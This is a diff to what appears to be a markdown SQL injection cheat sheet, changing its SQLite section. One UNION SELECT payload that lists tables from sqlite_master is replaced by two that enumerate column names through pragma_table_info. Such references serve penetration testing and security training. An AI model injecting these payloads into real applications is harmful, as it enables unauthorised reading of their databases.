@@ -134,10 +134,12 @@ WHERE xtype = 'U';-- -
 ### SQLite
 
 ```sql
-' UNION SELECT 1,2,3,4,5,6,name
-FROM sqlite_master
-WHERE type = 'table'
-AND name NOT LIKE 'sqlite_%';-- -
+
+' UNION SELECT 1,2,3,4,5,6,name FROM pragma_table_info('databasename');-- -
+
+
+
+' UNION SELECT 1,2,3,4,5,6,(SELECT GROUP_CONCAT(name) FROM pragma_table_info('databasename'));-- -
 ```
 
 ---
